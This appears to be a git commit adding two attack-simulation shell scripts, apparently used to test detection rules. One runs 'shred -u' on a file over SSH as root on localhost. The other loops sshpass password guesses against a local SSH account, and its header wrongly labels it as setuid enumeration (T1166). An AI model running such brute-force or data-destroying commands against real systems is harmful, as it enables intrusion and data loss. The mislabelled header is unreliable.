712878e94ee1775946782a072a5a9c9a8bb7f1ec
Tristan Duckworth <tgduckworth@gmail.com>
2018-04-17 18:55:05 -0500

    Fixed shred and login rule bugs and added attack scripts

---
+++ attacks/file_deletion_shred.sh
@@ -0,0 +1,1 @@
+ssh -p 2222 root@127.0.0.1 "touch test; shred -u test"
---
+++ attacks/login_brute_force.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+# Tactic: Privilege Escalation
+# Name: Setuid Enumeration
+# ID: 	T1166
+# Enumerates any files with setuid permissions
+i=1
+while [ $i -le 25 ]
+do
+    echo "Trying guess$i"
+    sshpass -p guess$i ssh -p 2222 daemon@127.0.0.1
+    i=$(($i+1))
+done
+echo "Brute forcing failed"
